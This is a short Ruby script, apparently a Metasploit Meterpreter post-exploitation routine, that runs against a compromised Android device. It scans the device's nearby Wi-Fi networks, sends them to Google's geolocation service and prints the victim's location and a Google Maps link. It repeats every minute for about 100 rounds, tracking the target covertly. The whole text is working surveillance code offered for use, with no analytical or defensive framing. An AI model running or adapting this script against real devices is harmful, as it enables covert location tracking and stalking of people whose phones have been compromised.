for i in 0..100
	for i in 0..9
		log = client.android.wlan_geolocate
		wlan_list = []
		log.each do |x|
			mac = x['bssid']
			ssid = x['ssid']
			ss = x['level']
			wlan_list << [mac, ssid, ss.to_s]
		end

		if wlan_list.to_s.empty?
			print_error("Unable to enumerate wireless networks from the target.  Wireless may not be present or enabled.")
			return
		end

		g = Rex::Google::Geolocation.new

		wlan_list.each do |wlan|
			g.add_wlan(*wlan)
		end

		begin
			g.fetch!
		rescue RuntimeError => e
			print_error("Error: #{e}")
		else
			print_status(g.to_s)
			print_status("Google Maps URL:  #{g.google_maps_url}")
		end
	end
	puts("------------------------------------------")
	sleep(60)
	
end
